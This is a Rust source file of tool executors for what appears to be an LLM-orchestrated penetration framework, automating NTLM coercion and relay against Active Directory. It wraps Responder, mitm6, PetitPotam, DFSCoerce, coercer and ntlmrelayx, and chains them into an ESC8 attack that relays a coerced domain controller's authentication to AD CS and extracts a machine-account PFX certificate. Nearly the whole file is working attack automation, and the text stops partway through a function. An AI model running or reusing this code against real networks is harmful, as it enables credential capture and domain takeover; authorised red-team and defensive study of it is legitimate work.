//! NTLM coercion and relay tool executors.
//!
//! Each function takes a JSON `Value` of arguments and returns a `ToolOutput`
//! produced by running the corresponding CLI tool as a subprocess.

use std::io::Write;
use std::net::TcpListener;
use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::time::{Duration, Instant};

use anyhow::{Context, Result};
use base64::Engine;
use serde_json::Value;
use tokio::process::{Child, Command as TokioCommand};
use tokio::time::sleep;

use crate::args::{optional_bool, optional_str, required_str};
use crate::executor::CommandBuilder;
use crate::ToolOutput;

/// Start Responder on a network interface to capture NTLM hashes.
///
/// Optional args: `interface` (default "eth0"), `analyze_mode`
pub async fn start_responder(args: &Value) -> Result<ToolOutput> {
    let interface = optional_str(args, "interface").unwrap_or("eth0");
    let analyze_mode = optional_bool(args, "analyze_mode").unwrap_or(false);

    CommandBuilder::new("responder")
        .flag("-I", interface)
        .arg_if(analyze_mode, "-A")
        .timeout_secs(30)
        .execute()
        .await
}

/// Start mitm6 to perform IPv6 DNS takeover for NTLM relay.
///
/// Required args: `domain`
/// Optional args: `interface` (default "eth0")
pub async fn start_mitm6(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let interface = optional_str(args, "interface").unwrap_or("eth0");

    CommandBuilder::new("mitm6")
        .flag("-d", domain)
        .flag("-i", interface)
        .timeout_secs(30)
        .execute()
        .await
}

/// Coerce NTLM authentication from a target using all known protocols.
///
/// Required args: `target`, `listener`
/// Optional args: `username`, `password`, `domain`
pub async fn coercer(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let listener = required_str(args, "listener")?;
    let username = optional_str(args, "username");
    let password = optional_str(args, "password");
    let domain = optional_str(args, "domain");

    let mut cmd = CommandBuilder::new("coercer")
        .arg("coerce")
        .flag("-t", target)
        .flag("-l", listener)
        .arg("--always-continue")
        .timeout_secs(120);

    if let Some(u) = username {
        cmd = cmd.flag("-u", u);
    }
    if let Some(p) = password {
        cmd = cmd.flag("-p", p);
    }
    if let Some(d) = domain {
        cmd = cmd.flag("-d", d);
    }

    cmd.execute().await
}

/// Coerce NTLM authentication via MS-EFSR (PetitPotam).
///
/// Required args: `target`, `listener`
/// Optional args: `username`, `password`, `domain`
pub async fn petitpotam(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let listener = required_str(args, "listener")?;
    let username = optional_str(args, "username");
    let password = optional_str(args, "password");
    let domain = optional_str(args, "domain");

    let mut cmd = CommandBuilder::new("coercer")
        .arg("coerce")
        .flag("-t", target)
        .flag("-l", listener)
        .args(["--filter-protocol-name", "MS-EFSR"])
        .arg("--always-continue")
        .timeout_secs(60);

    if let Some(u) = username {
        cmd = cmd.flag("-u", u);
    }
    if let Some(p) = password {
        cmd = cmd.flag("-p", p);
    }
    if let Some(d) = domain {
        cmd = cmd.flag("-d", d);
    }

    cmd.execute().await
}

/// Coerce NTLM authentication via MS-DFSNM (DFSCoerce).
///
/// Required args: `target`, `listener`
/// Optional args: `username`, `password`, `domain`
pub async fn dfscoerce(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let listener = required_str(args, "listener")?;
    let username = optional_str(args, "username");
    let password = optional_str(args, "password");
    let domain = optional_str(args, "domain");

    let mut cmd = CommandBuilder::new("dfscoerce")
        .arg(listener)
        .arg(target)
        .timeout_secs(60);

    if let Some(u) = username {
        cmd = cmd.flag("-u", u);
    }
    if let Some(p) = password {
        cmd = cmd.flag("-p", p);
    }
    if let Some(d) = domain {
        cmd = cmd.flag("-d", d);
    }

    cmd.execute().await
}

/// Standalone-relay BUSY response. Standalone `ntlmrelayx_to_*` tools share
/// the host-wide port 445 (and SOCKS 1080) with `relay_and_coerce`; a second
/// invocation while one is already in flight crashes with
/// `OSError [Errno 98] Address already in use`. We acquire the same loopback
/// sentinel the composite path uses and refuse to race when contended.
fn relay_busy_output(tool: &str) -> ToolOutput {
    ToolOutput {
        stdout: format!(
            "RELAY_BIND_BUSY\n{tool}: another relay/coerce invocation is active \
             on this host (loopback port {RELAY_LOCK_PORT} held). Refusing to \
             race for ntlmrelayx port 445; retry after the in-flight relay \
             completes."
        ),
        stderr: String::new(),
        exit_code: Some(0),
        success: false,
    }
}

/// Relay captured NTLM authentication to LDAPS for delegation abuse.
///
/// Required args: `dc_ip`
/// Optional args: `delegate_access`
pub async fn ntlmrelayx_to_ldaps(args: &Value) -> Result<ToolOutput> {
    let dc_ip = required_str(args, "dc_ip")?;
    let delegate_access = optional_bool(args, "delegate_access").unwrap_or(false);

    let _lock = match try_acquire_relay_lock() {
        Some(l) => l,
        None => return Ok(relay_busy_output("ntlmrelayx_to_ldaps")),
    };

    let target_url = format!("ldaps://{dc_ip}");

    CommandBuilder::new("impacket-ntlmrelayx")
        .flag("-t", target_url)
        .arg_if(delegate_access, "--delegate-access")
        .timeout_secs(120)
        .execute()
        .await
}

/// Relay captured NTLM authentication to AD CS web enrollment.
///
/// Required args: `ca_host`
/// Optional args: `template`
pub async fn ntlmrelayx_to_adcs(args: &Value) -> Result<ToolOutput> {
    let ca_host = required_str(args, "ca_host")?;
    let template = optional_str(args, "template");

    let _lock = match try_acquire_relay_lock() {
        Some(l) => l,
        None => return Ok(relay_busy_output("ntlmrelayx_to_adcs")),
    };

    let target_url = format!("http://{ca_host}/certsrv/certfnsh.asp");

    CommandBuilder::new("impacket-ntlmrelayx")
        .flag("-t", target_url)
        .arg("--adcs")
        .flag_opt("--template", template)
        .timeout_secs(120)
        .execute()
        .await
}

/// Relay captured NTLM authentication to SMB on a target.
///
/// Required args: `target_ip`
/// Optional args: `socks`, `interactive`
pub async fn ntlmrelayx_to_smb(args: &Value) -> Result<ToolOutput> {
    let target_ip = required_str(args, "target_ip")?;
    let socks = optional_bool(args, "socks").unwrap_or(false);
    let interactive = optional_bool(args, "interactive").unwrap_or(false);

    let _lock = match try_acquire_relay_lock() {
        Some(l) => l,
        None => return Ok(relay_busy_output("ntlmrelayx_to_smb")),
    };

    CommandBuilder::new("impacket-ntlmrelayx")
        .flag("-t", target_ip)
        .arg_if(socks, "-socks")
        .arg_if(interactive, "-i")
        .timeout_secs(120)
        .execute()
        .await
}

/// Parsed + validated args for [`relay_and_coerce`]. Pulled into a struct so
/// the validation logic can be unit-tested without spawning subprocesses.
#[derive(Debug, Clone, PartialEq, Eq)]
struct RelayCoerceConfig {
    ca_host: String,
    coerce_target: String,
    attacker_ip: String,
    coerce_user: Option<String>,
    coerce_domain: String,
    coerce_secret: Option<CoerceSecret>,
    template: String,
}

#[derive(Debug, Clone, PartialEq, Eq)]
enum CoerceSecret {
    Hash(String),
    Password(String),
}

fn parse_relay_coerce_args(args: &Value) -> Result<RelayCoerceConfig> {
    let ca_host = required_str(args, "ca_host")?;
    // Accept legacy `target_dc` as an alias for backwards compat with state
    // injected before the rename.
    let coerce_target = optional_str(args, "coerce_target")
        .or_else(|| optional_str(args, "target_dc"))
        .ok_or_else(|| {
            anyhow::anyhow!("relay_and_coerce: missing required argument 'coerce_target'")
        })?;
    let attacker_ip = required_str(args, "attacker_ip")?;
    let coerce_user = optional_str(args, "coerce_user").filter(|s| !s.is_empty());
    let coerce_domain = optional_str(args, "coerce_domain").unwrap_or("");
    let coerce_hash = optional_str(args, "coerce_hash").filter(|s| !s.is_empty());
    let coerce_password = optional_str(args, "coerce_password").filter(|s| !s.is_empty());
    let template = optional_str(args, "template").unwrap_or("DomainController");

    // Source ≠ target. Coercing the CA host itself triggers same-machine
    // NTLM loopback rejection at IIS. Conservative literal compare — callers
    // mixing hostname/IP across the two args still slip through, that's their
    // problem to keep distinct.
    if coerce_target == ca_host {
        anyhow::bail!(
            "relay_and_coerce: coerce_target ({coerce_target}) must differ from ca_host \
             ({ca_host}); same-machine NTLM loopback protection blocks relayed auth. \
             Coerce a different machine account (e.g. another DC) and relay it to this CA."
        );
    }

    if coerce_user.is_some() && coerce_hash.is_none() && coerce_password.is_none() {
        anyhow::bail!(
            "relay_and_coerce: coerce_user provided without coerce_hash or coerce_password"
        );
    }

    // Defensive newline check so a stray input can't smuggle a second arg
    // into a child process via env propagation. Single-quote no longer matters
    // (no shell), but keep newline reject — embedded newlines in a hash or
    // hostname are always wrong.
    for (name, val) in [
        ("ca_host", ca_host),
        ("coerce_target", coerce_target),
        ("attacker_ip", attacker_ip),
        ("coerce_user", coerce_user.unwrap_or("")),
        ("coerce_domain", coerce_domain),
        ("template", template),
    ] {
        if val.contains('\n') || val.contains('\'') {
            anyhow::bail!("{name} contains forbidden character (newline or single-quote)");
        }
    }

    let coerce_secret = if let Some(h) = coerce_hash {
        if h.contains('\n') || h.contains('\'') || h.contains(' ') {
            anyhow::bail!("coerce_hash contains forbidden character");
        }
        Some(CoerceSecret::Hash(h.to_string()))
    } else if let Some(p) = coerce_password {
        if p.contains('\n') || p.contains('\'') {
            anyhow::bail!("coerce_password contains forbidden character");
        }
        Some(CoerceSecret::Password(p.to_string()))
    } else {
        None
    };

    Ok(RelayCoerceConfig {
        ca_host: ca_host.to_string(),
        coerce_target: coerce_target.to_string(),
        attacker_ip: attacker_ip.to_string(),
        coerce_user: coerce_user.map(String::from),
        coerce_domain: coerce_domain.to_string(),
        coerce_secret,
        template: template.to_string(),
    })
}

// === Trait-based execution seam =====================================
//
// The phase-progression logic (spawn relay → run coerce phases → poll
// log → extract cert) is exercised by unit tests via FakeCoerceProcs,
// which scripts subprocess outcomes and relay-log writes. Production
// uses RealCoerceProcs which wraps tokio::process::{Command,Child}.

trait RelayHandle {
    fn pid(&self) -> u32;
    /// Sleep `settle` (giving the process time to bind ports), then check
    /// whether it has already exited. Returns the exit code if so.
    async fn settle_then_try_wait(&mut self, settle: Duration) -> Option<i32>;
    async fn kill_and_wait(&mut self, timeout: Duration);
}

trait CoerceProcs {
    type Handle: RelayHandle;
    fn is_local_ip(&self, ip: &str) -> bool;
    fn list_local_ips(&self) -> Vec<String>;
    fn which_binary(&self, name: &str) -> bool;
    async fn cleanup_stale_listeners(&self, workdir: &Path);
    async fn spawn_relay(
        &self,
        target_url: &str,
        template: &str,
        relay_log: &Path,
        workdir: &Path,
    ) -> Result<Self::Handle>;
    async fn run_phase(
        &self,
        coerce_log: &Path,
        header: &str,
        bin: &str,
        args: &[&str],
        cwd: &Path,
        timeout_secs: u64,
    );
}

#[derive(Debug, Clone, Copy)]
struct RunOptions {
    relay_settle: Duration,
    poll_interval: Duration,
    poll_phase_1: Duration,
    poll_phase_2: Duration,
    poll_phase_3: Duration,
    post_capture_settle: Duration,
    relay_kill_timeout: Duration,
    keep_workdir_on_capture: bool,
    /// Whether to acquire the host-wide TCP-port mutex before spawning the
    /// relay. Production sets this to `true` to serialize concurrent
    /// invocations across worker processes; unit tests set `false` so they
    /// can run in parallel without fighting over the loopback sentinel port.
    acquire_host_lock: bool,
    /// How long to wait for port 445 to become free after
    /// `cleanup_stale_listeners` before bailing with `RELAY_BIND_BUSY`. A
    /// TIME_WAIT socket from a prior bind typically clears in ~30s on
    /// Linux; an unmanaged smbd / samba-vfs holder never clears, so we
    /// surface the situation rather than letting ntlmrelayx crash.
    bind_check: Duration,
}

impl RunOptions {
    fn production() -> Self {
        Self {
            relay_settle: Duration::from_secs(3),
            poll_interval: Duration::from_millis(500),
            poll_phase_1: Duration::from_secs(8),
            poll_phase_2: Duration::from_secs(10),
            poll_phase_3: Duration::from_secs(8),
            post_capture_settle: Duration::from_secs(5),
            relay_kill_timeout: Duration::from_secs(5),
            keep_workdir_on_capture: true,
            acquire_host_lock: true,
            bind_check: Duration::from_secs(10),
        }
    }
}

/// Wait for the given TCP port to become free on `0.0.0.0`. Polls every
/// 250ms via a connect probe to `127.0.0.1:<port>`; a connection refused
/// means nothing is listening. Returns `Ok(())` as soon as the port is
/// free, `Err(reason)` if `timeout` elapses while it's still held.
async fn wait_for_port_free(port: u16, timeout: Duration) -> std::result::Result<(), String> {
    use tokio::net::TcpStream;
    let deadline = std::time::Instant::now() + timeout;
    let addr = format!("127.0.0.1:{port}");
    let mut last_reason;
    loop {
        let probe =
            tokio::time::timeout(Duration::from_millis(200), TcpStream::connect(&addr)).await;
        match probe {
            // Connection refused → no listener → port is free.
            Ok(Err(e)) if e.kind() == std::io::ErrorKind::ConnectionRefused => {
                return Ok(());
            }
            // Connected → something is listening on the port.
            Ok(Ok(_)) => {
                last_reason = format!("listener still bound on 127.0.0.1:{port}");
            }
            // Probe timeout — usually firewalled; treat as held for safety.
            Err(_) => {
                last_reason = format!("connect probe to 127.0.0.1:{port} timed out");
            }
            // Other connect error — surface verbatim.
            Ok(Err(e)) => {
                last_reason = format!("probe error: {e}");
            }
        }
        if std::time::Instant::now() >= deadline {
            return Err(last_reason);
        }
        sleep(Duration::from_millis(250)).await;
    }
}

// --- Real (production) implementation -------------------------------

struct RealCoerceProcs;

struct RealRelayHandle {
    child: Child,
}

impl RelayHandle for RealRelayHandle {
    fn pid(&self) -> u32 {
        self.child.id().unwrap_or(0)
    }

    async fn settle_then_try_wait(&mut self, settle: Duration) -> Option<i32> {
        sleep(settle).await;
        match self.child.try_wait() {
            Ok(Some(status)) => Some(status.code().unwrap_or(-1)),
            _ => None,
        }
    }

    async fn kill_and_wait(&mut self, timeout: Duration) {
        let _ = self.child.start_kill();
        let _ = tokio::time::timeout(timeout, self.child.wait()).await;
    }
}

impl CoerceProcs for RealCoerceProcs {
    type Handle = RealRelayHandle;

    fn is_local_ip(&self, ip: &str) -> bool {
        use std::net::{IpAddr, UdpSocket};
        let parsed: IpAddr = match ip.parse() {
            Ok(addr) => addr,
            Err(_) => return false,
        };
        if parsed.is_loopback() || parsed.is_unspecified() || parsed.is_multicast() {
            return false;
        }
        UdpSocket::bind((parsed, 0)).is_ok()
    }

    fn list_local_ips(&self) -> Vec<String> {
        use std::net::UdpSocket;
        let mut out = Vec::new();
        if let Ok(sock) = UdpSocket::bind("0.0.0.0:0") {
            if sock.connect("8.8.8.8:53").is_ok() {
                if let Ok(local) = sock.local_addr() {
                    let ip = local.ip().to_string();
                    if !ip.starts_with("127.") {
                        out.push(ip);
                    }
                }
            }
        }
        out
    }

    fn which_binary(&self, name: &str) -> bool {
        let Some(path) = std::env::var_os("PATH") else {
            return false;
        };
        for dir in std::env::split_paths(&path) {
            if dir.join(name).is_file() {
                return true;
            }
        }
        false
    }

    async fn cleanup_stale_listeners(&self, workdir: &Path) {
        // pkill returns 1 if no match — fine; we want at-most-once semantics,
        // not strict success. ntlmrelayx surfaces RELAY_BIND_FAILED later if a
        // non-impacket process is still holding the ports.
        for pat in [
            "impacket-ntlmrelayx",
            "ntlmrelayx.py",
            "Responder.py",
            "impacket-petitpotam",
        ] {
            let _ = TokioCommand::new("pkill")
                .arg("-f")
                .arg(pat)
                .stdin(Stdio::null())
                .stdout(Stdio::null())
                .stderr(Stdio::null())
                .current_dir(workdir)
                .status()
                .await;
        }
        sleep(Duration::from_millis(500)).await;
    }

    async fn spawn_relay(
        &self,
        target_url: &str,
        template: &str,
        relay_log: &Path,
        workdir: &Path,
    ) -> Result<Self::Handle> {
        let relay_log_out = std::fs::File::create(relay_log).context("create relay.log")?;
        let relay_log_err = relay_log_out.try_clone().context("dup relay.log fd")?;
        // ntlmrelayx writes captured PFXs (and BloodHound JSON) relative to its
        // own CWD. Pin it to the workdir so artifacts land where we can find
        // them (and not in the worker's `/`). --keep-relaying prevents the
        // first inbound (often anonymous) connection from causing "All targets
        // processed!" before the real coerced DC calls back.
        let child = TokioCommand::new("impacket-ntlmrelayx")
            .arg("-t")
            .arg(target_url)
            .arg("--adcs")
            .arg("--template")
            .arg(template)
            .arg("-smb2support")
            .arg("--keep-relaying")
            .arg("--no-da")
            .arg("--no-acl")
            .arg("--no-validate-privs")
            .arg("--no-dump")
            .current_dir(workdir)
            .stdin(Stdio::piped())
            .stdout(Stdio::from(relay_log_out))
            .stderr(Stdio::from(relay_log_err))
            .kill_on_drop(true)
            .spawn()
            .context("failed to spawn impacket-ntlmrelayx (is it installed?)")?;
        Ok(RealRelayHandle { child })
    }

    async fn run_phase(
        &self,
        coerce_log: &Path,
        header: &str,
        bin: &str,
        args: &[&str],
        cwd: &Path,
        timeout_secs: u64,
    ) {
        let mut cmd = TokioCommand::new(bin);
        for a in args {
            cmd.arg(a);
        }
        cmd.current_dir(cwd).stdin(Stdio::null());
        let timeout = Duration::from_secs(timeout_secs);
        match tokio::time::timeout(timeout, cmd.output()).await {
            Ok(Ok(out)) => append_output(coerce_log, header, &out).await,
            Ok(Err(e)) => append_error(coerce_log, header, &format!("spawn failed: {e}")).await,
            Err(_) => {
                append_error(
                    coerce_log,
                    header,
                    &format!("timed out after {timeout_secs}s"),
                )
                .await
            }
        }
    }
}

/// Composite ESC8 relay+coerce. Starts ntlmrelayx targeting AD CS web
/// enrollment, coerces a chosen machine account over unauth PetitPotam →
/// authenticated DFSCoerce → MS-EFSR → MS-RPRN until the relay log shows a
/// cert capture, then decodes the base64 cert from the log and emits
/// deterministic `PFX_FILE=` / `RELAYED_USER=` markers for the parser.
///
/// Required args: `ca_host`, `coerce_target`, `attacker_ip`.
/// Optional args: `coerce_user`, `coerce_domain`, `coerce_hash` /
/// `coerce_password`, `template` (default "DomainController").
///
/// **Source ≠ target.** `coerce_target` MUST differ from `ca_host`. When CA
/// is co-located on the DC (common in lab AD), coercing the same host triggers
/// Microsoft's same-machine NTLM loopback protection and ADCS rejects the
/// relayed auth. Coerce a different DC or member instead — e.g. a child-DC
/// machine account relayed to the parent forest's CA.
///
/// Phase 1 always runs unauthenticated PetitPotam (works against unpatched
/// DCs without creds). Phase 2 runs authenticated DFSCoerce. Phase 3 runs
/// `coercer` for MS-EFSR / MS-RPRN. Phases 2/3 are skipped when no creds
/// are supplied.
pub async fn relay_and_coerce(args: &Value) -> Result<ToolOutput> {
    let cfg = parse_relay_coerce_args(args)?;
    run_relay_and_coerce(cfg, &RealCoerceProcs, RunOptions::production()).await
}

/// Host-wide TCP-port mutex. ntlmrelayx binds 0.0.0.0:445 (and 80) globally;
/// two relay invocations racing on the same host produce
/// `OSError [Errno 98] Address already in use` and the loser silently fails
/// to relay anything. The orchestrator dispatches `relay_and_coerce` from
/// multiple workers (separate processes), so an intra-process Mutex is not
/// enough — we need cross-process serialization.
///
/// Trick: bind a TCP listener to a fixed loopback port (41445). The kernel
/// guarantees only one process can hold the port at a time, and releases it
/// automatically when the listener is dropped or the process dies. No file
/// cleanup required, no stale-lock races. Hold the returned listener for the
/// lifetime of the relay; drop it (implicitly) to release.
const RELAY_LOCK_PORT: u16 = 41445;

#[cfg(test)]
thread_local! {
    /// When set on a test thread, [`try_acquire_relay_lock`] uses the real
    /// host-wide port instead of bypassing it. The contention test sets this
    /// so its assertion that a held port returns `None` still works; all other
    /// tests leave it false so they don't fight over the single port.
    static USE_REAL_RELAY_LOCK_IN_TEST: std::cell::Cell<bool> =
        const { std::cell::Cell::new(false) };
}

fn try_acquire_relay_lock() -> Option<TcpListener> {
    #[cfg(test)]
    {
        // Default test behavior: bind to an ephemeral loopback port so tests
        // never contend on the single host-wide sentinel. Tests that need to
        // exercise contention semantics opt in via USE_REAL_RELAY_LOCK_IN_TEST.
        if !USE_REAL_RELAY_LOCK_IN_TEST.with(|c| c.get()) {
            return TcpListener::bind("127.0.0.1:0").ok();
        }
    }
    use std::net::SocketAddr;
    let addr: SocketAddr = ([127, 0, 0, 1], RELAY_LOCK_PORT).into();
    TcpListener::bind(addr).ok()
}

async fn run_relay_and_coerce<P: CoerceProcs>(
    cfg: RelayCoerceConfig,
    procs: &P,
    opts: RunOptions,
) -> Result<ToolOutput> {
    // attacker_ip MUST be one of our local interface IPs. The LLM has been
    // observed to misread context and pass a *target* host (e.g. DC01)
    // as the attacker IP, which makes the relay listener bind to 0.0.0.0 but
    // PetitPotam tells the coerced DC to authenticate back to the wrong host
    // — auth never reaches the relay. Fail fast with a clear error.
    if !procs.is_local_ip(&cfg.attacker_ip) {
        anyhow::bail!(
            "relay_and_coerce: attacker_ip ({}) is not a local interface IP. \
             Pass the listener_ip / attacker_ip exactly as supplied by the \
             orchestrator payload — this MUST be the attacker host's IP \
             (where the relay listener binds), NOT a target machine. \
             Available local IPs: {}",
            cfg.attacker_ip,
            procs.list_local_ips().join(", "),
        );
    }

    // Acquire the host-wide relay lock BEFORE any teardown of stale listeners.
    // If another relay_and_coerce invocation is in flight on this host, refuse
    // immediately with RELAY_BIND_BUSY rather than racing it for port 445 and
    // both losing — the dispatcher's dedup will retry on the next tick.
    //
    // Must come before `cleanup_stale_listeners`; otherwise we'd pkill the
    // in-flight peer's ntlmrelayx and corrupt its capture mid-flight.
    //
    // The listener is held in `_relay_lock` so the kernel keeps the port bound
    // for the whole function body. Drop on return automatically releases it.
    let _relay_lock = if opts.acquire_host_lock {
        match try_acquire_relay_lock() {
            Some(l) => Some(l),
            None => {
                return Ok(ToolOutput {
                    stdout: format!(
                        "RELAY_BIND_BUSY\nAnother relay_and_coerce is active on this \
                         host (loopback port {RELAY_LOCK_PORT} held). Refusing to race \
                         for ntlmrelayx port 445; retry after the in-flight relay \
                         completes."
                    ),
                    stderr: String::new(),
                    exit_code: Some(0),
                    success: false,
                });
            }
        }
    } else {
        None
    };

    let tempdir = tempfile::Builder::new()
        .prefix("ares_relay_")
        .tempdir()
        .context("failed to create relay workdir")?;
    let workdir = tempdir.path().to_path_buf();
    let relay_log = workdir.join("relay.log");
    let coerce_log = workdir.join("coerce.log");

    procs.cleanup_stale_listeners(&workdir).await;

    // Port 445 must be free before ntlmrelayx binds, or the spawn dies
    // immediately with `OSError [Errno 98] Address already in use`. The
    // pkill in `cleanup_stale_listeners` handles ntlmrelayx/Responder
    // processes we started, but a non-impacket holder (system `smbd`,
    // socket lingering in TIME_WAIT) survives. Poll the port and either
    // wait it out or bail with a clear actionable error — both outcomes
    // are better than feeding the LLM a generic bind-failed log.
    //
    // `bind_check == 0` disables the probe entirely (used by unit tests
    // whose mock procs don't actually spawn ntlmrelayx).
    if !opts.bind_check.is_zero() {
        if let Err(busy) = wait_for_port_free(445, opts.bind_check).await {
            return Ok(ToolOutput {
                stdout: format!(
                    "RELAY_BIND_BUSY\nport 445 still occupied after pkill + {ms}ms wait. \
                     Either another SMB listener (smbd, samba-vfs, an unmanaged \
                     ntlmrelayx) is holding it, or a TIME_WAIT socket from a prior \
                     bind is lingering. Check with `ss -tlnp '( sport = :445 )'` on \
                     the worker host. Last error: {busy}",
                    ms = opts.bind_check.as_millis()
                ),
                stderr: String::new(),
                exit_code: Some(0),
                success: false,
            });
        }
    }

    let target_url = format!("http://{}/certsrv/certfnsh.asp", cfg.ca_host);
    let mut relay = procs
        .spawn_relay(&target_url, &cfg.template, &relay_log, &workdir)
        .await?;

    // Give it a moment to bind ports; if it died, surface RELAY_BIND_FAILED.
    if let Some(code) = relay.settle_then_try_wait(opts.relay_settle).await {
        let log = tokio::fs::read_to_string(&relay_log)
            .await
            .unwrap_or_default();
        return Ok(ToolOutput {
            stdout: format!("RELAY_BIND_FAILED\n{log}"),
            stderr: String::new(),
            exit_code: Some(code),
            success: false,
        });
    }

    let mut summary = format!("RELAY_PID={}\n", relay.pid());
    let mut captured_via: Option<&'static str> = None;

    // --- Phase 1: unauthenticated PetitPotam ---
    // Distros differ: Kali ships `petitpotam` (symlink), pip ships
    // `impacket-petitpotam`. Try in order, log if both missing.
    summary.push_str("=== Phase 1: unauth PetitPotam ===\n");
    let petit_bin = ["petitpotam", "impacket-petitpotam"]
        .into_iter()
        .find(|b| procs.which_binary(b))
        .unwrap_or("petitpotam");
    // PetitPotam positional args are `target path` (where `target` is the
    // machine being coerced and `path` is the UNC the target authenticates
    // back to). Reversing them coerces the attacker host onto itself.
    let unc_path = format!("\\\\{}\\share\\x", cfg.attacker_ip);
    let p1_args: [&str; 2] = [cfg.coerce_target.as_str(), unc_path.as_str()];
    procs
        .run_phase(
            &coerce_log,
            "Phase 1: unauth PetitPotam",
            petit_bin,
            &p1_args,
            &workdir,
            25,
        )
        .await;
    if poll_for_cert(&relay_log, opts.poll_phase_1, opts.poll_interval).await {
        captured_via = Some("unauth_petitpotam");
    }

    // --- Phase 2: authenticated DFSCoerce ---
    if captured_via.is_none() && cfg.coerce_user.is_some() {
        summary.push_str("=== Phase 2: authenticated DFSCoerce (MS-DFSNM) ===\n");
        let user = cfg.coerce_user.as_deref().unwrap();
        let secret_args = coerce_secret_args(cfg.coerce_secret.as_ref());
        let mut a: Vec<&str> = vec!["-u", user, "-d", cfg.coerce_domain.as_str()];
        for s in &secret_args {
            a.push(s.as_str());
        }
        a.push(cfg.attacker_ip.as_str());
        a.push(cfg.coerce_target.as_str());
        procs
            .run_phase(
                &coerce_log,
                "Phase 2: DFSCoerce",
                "dfscoerce",
                &a,
                &workdir,
                25,
            )
            .await;
        if poll_for_cert(&relay_log, opts.poll_phase_2, opts.poll_interval).await {
            captured_via = Some("MS-DFSNM");
        }
    }

    // --- Phase 3: coercer over MS-EFSR / MS-RPRN ---
    if captured_via.is_none() && cfg.coerce_user.is_some() {
        let user = cfg.coerce_user.as_deref().unwrap();
        let secret_args = coerce_secret_args(cfg.coerce_secret.as_ref());
        for proto in ["MS-EFSR", "MS-RPRN"] {
            summary.push_str(&format!(
                "=== Phase 3: authenticated coerce via {proto} ===\n"
            ));
            let mut a: Vec<&str> = vec![
                "coerce",
                "-u",
                user,
                "-d",
                cfg.coerce_domain.as_str(),
                "-t",
                cfg.coerce_target.as_str(),
                "-l",
                cfg.attacker_ip.as_str(),
                "--filter-protocol-name",
                proto,
                "--auth-type",
                "smb",
                "--always-continue",
            ];
            for s in &secret_args {
                a.push(s.as_str());
            }
            procs
                .run_phase(
                    &coerce_log,
                    &format!("Phase 3: {proto}"),
                    "coercer",
                    &a,
                    &workdir,
                    25,
                )
                .await;
            if poll_for_cert(&relay_log, opts.poll_phase_3, opts.poll_interval).await {
                captured_via = Some(proto);
                break;
            }
        }
    }

    // Allow any in-flight ADCS request to finish writing the cert.
    if captured_via.is_some() {
        sleep(opts.post_capture_settle).await;
    }

    relay.kill_and_wait(opts.relay_kill_timeout).await;

    // Extract cert from the relay log if captured. Two ntlmrelayx output
    // shapes need handling:
    //   1. `--adcs` (our path) — writes the PFX to disk and logs
    //      "Writing PKCS#12 certificate to ./<user>.pfx" + earlier
    //      "Authenticating connection from .../<USER>$@ip" lines.
    //   2. `--ldap` userCertificate — logs "Base64 certificate of user <USER>:"
    //      followed by the base64 blob on the next line. Kept as fallback.
    let mut pfx_path: Option<PathBuf> = None;
    let mut relayed_user: Option<String> = None;
    if captured_via.is_some() {
        let log = tokio::fs::read_to_string(&relay_log)
            .await
            .unwrap_or_default();

        if let Some(cap) = extract_pfx_capture_from_log(&log) {
            let bare = cap.pfx_basename.trim_start_matches("./");
            let candidate = workdir.join(bare);
            if tokio::fs::metadata(&candidate).await.is_ok() {
                pfx_path = Some(candidate);
                relayed_user = Some(cap.user);
            }
        }

        if pfx_path.is_none() {
            if let Some((user, b64)) = extract_cert_from_log(&log) {
                let pfx = workdir.join(format!("{user}.pfx"));
                let cleaned: String = b64.chars().filter(|c| !c.is_whitespace()).collect();
                if let Ok(bytes) = base64::engine::general_purpose::STANDARD.decode(&cleaned) {
                    if !bytes.is_empty() && tokio::fs::write(&pfx, &bytes).await.is_ok() {
                        pfx_path = Some(pfx);
                        relayed_user = Some(user);
                    }
                }
            }
        }
    }

    let mut stdout = summary;
    if let Some(via) = captured_via {
        stdout.push_str(&format!("CERT_CAPTURED_VIA={via}\n"));
    }
    if let (Some(p), Some(u)) = (pfx_path.as_ref(), relayed_user.as_ref()) {
        stdout.push_str(&format!("PFX_FILE={}\n", p.display()));
        stdout.push_str(&format!("RELAYED_USER={u}\n"));
    }
    stdout.push_str("=== RELAY LOG ===\n");
    stdout.push_str(
        &tokio::fs::read_to_string(&relay_log)
            .await
            .unwrap_or_default(),
    );
    stdout.push_str("=== COERCE LOG ===\n");
    stdout.push_str(
        &tokio::fs::read_to_string(&coerce_log)
            .await
            .unwrap_or_default(),
    );

    let success = pfx_path.is_some();

    // Persist workdir if we resolved a PFX OR if a cert was captured (so
    // operators can debug extraction failures without losing the artifact).
    if (success || captured_via.is_some()) && opts.keep_workdir_on_capture {
        let _ = tempdir.keep();
    }

    Ok(ToolOutput {
        stdout,
        stderr: String::new(),
        exit_code: Some(if success { 0 } else { 1 }),
        success,
    })
}

fn coerce_secret_args(secret: Option<&CoerceSecret>) -> Vec<String> {
    match secret {
        Some(CoerceSecret::Hash(h)) => vec!["-hashes".into(), format!(":{h}")],
        Some(CoerceSecret::Password(p)) => vec!["-p".into(), p.clone()],
        None => Vec::new(),
    }
}

async fn append_output(path: &Path, header: &str, output: &std::process::Output) {
    use tokio::io::AsyncWriteExt;
    if let Ok(mut f) = tokio::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(path)
        .await
    {
        let _ = f.write_all(b"=== ").await;
        let _ = f.write_all(header.as_bytes()).await;
        let _ = f.write_all(b" ===\n").await;
        let _ = f.write_all(&output.stdout).await;
        let _ = f.write_all(&output.stderr).await;
        let _ = f.write_all(b"\n").await;
    }
}

async fn append_error(path: &Path, header: &str, msg: &str) {
    use tokio::io::AsyncWriteExt;
    if let Ok(mut f) = tokio::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(path)
        .await
    {
        let _ = f.write_all(b"=== ").await;
        let _ = f.write_all(header.as_bytes()).await;
        let _ = f.write_all(b" ===\n[ERROR] ").await;
        let _ = f.write_all(msg.as_bytes()).await;
        let _ = f.write_all(b"\n").await;
    }
}

async fn poll_for_cert(relay_log: &Path, max: Duration, interval: Duration) -> bool {
    let deadline = Instant::now() + max;
    loop {
        if let Ok(s) = tokio::fs::read_to_string(relay_log).await {
